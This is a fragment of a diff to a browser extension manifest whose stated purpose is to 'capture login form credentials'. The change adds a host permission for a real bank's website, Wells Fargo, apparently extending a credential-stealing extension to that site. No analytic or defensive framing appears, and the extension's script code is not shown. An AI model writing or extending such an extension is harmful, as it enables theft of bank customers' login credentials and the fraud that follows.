@@ -4,7 +4,8 @@
     "version": "1.0",
     "description": "Capture login form credentials",
     "permissions": [
-      "activeTab"
+      "activeTab",
+      "https://www.wellsfargo.com/*"
     ],
     "background": {
       "scripts": ["background.js"],
